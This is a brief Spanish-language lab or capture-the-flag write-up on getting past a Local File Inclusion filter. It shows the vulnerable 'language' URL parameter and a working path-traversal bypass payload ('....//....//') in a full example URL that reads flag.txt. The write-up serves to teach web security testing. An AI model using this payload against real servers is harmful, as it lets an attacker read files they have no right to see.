# LFI: ByPass Filter 🔐

La página web que vulneraremos es:

![Web.PNG](./assets/02-Segundo/01-web.PNG)

* Podemos seleccionar un **lenguaje** para nuestra página web, aquí es donde la url usa un **párametro** `?languaje=languages/<Archivo>.php`

---

El payload que usaremos es: `....//....//....//`
* **URL**: `http://<IP>/index.php?language=languages/....//....//....//....//....//flag.txt`

<p align="center">
    <img src="./assets/02-Segundo/02-flag.PNG">
</p>